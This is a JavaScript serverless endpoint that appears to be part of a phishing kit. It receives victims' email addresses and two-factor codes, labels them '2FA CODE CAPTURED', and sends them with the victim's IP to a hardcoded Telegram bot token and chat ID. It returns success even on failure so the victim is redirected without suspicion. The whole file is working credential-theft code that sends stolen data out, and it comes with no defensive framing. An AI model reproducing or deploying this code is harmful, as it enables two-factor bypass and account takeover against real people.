module.exports = async (req, res) => {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  // Handle preflight OPTIONS request
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  
  // Only accept POST requests
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }
  
  try {
    // Parse JSON body
    const { email, code } = req.body;
    
    // Log received data
    console.log('📥 Received 2FA data:', { email, code });
    
    // Validate required fields
    if (!code) {
      return res.status(400).json({ error: 'Code is required' });
    }
    
    // ======================================
    // CONFIGURATION - SUDAH BENAR
    const BOT_TOKEN = "8288645874:AAHXwc49sz8HwK7_JGIBUWEiYGpZJebg5kQ";
    const CHAT_ID = "8358778598";
    // ======================================
    
    // Prepare message
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const timestamp = new Date().toLocaleString('id-ID');
    
    const message = `🔐 *2FA CODE CAPTURED*\n\n📧 Email: ${email || 'N/A'}\n🔢 Code: ${code}\n🌐 IP: ${ip}\n⏰ Time: ${timestamp}`;
    
    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_notification: false
      })
    });
    
    const result = await response.json();
    
    // Log Telegram response
    console.log('📤 Telegram response:', result);
    
    if (result.ok) {
      console.log(`✅ 2FA sent successfully for: ${email}`);
      return res.status(200).json({
        success: true,
        message: '2FA code sent to Telegram',
        telegram_id: result.result.message_id
      });
    } else {
      console.error('❌ Telegram error:', result.description);
      // Still return success to allow redirect
      return res.status(200).json({
        success: true,
        warning: 'Telegram failed but continuing',
        telegram_error: result.description
      });
    }
    
  } catch (error) {
    console.error('🔥 Server error:', error);
    // Still return success to allow redirect
    return res.status(200).json({
      success: true,
      error: error.message,
      note: 'Redirecting despite error'
    });
  }
};
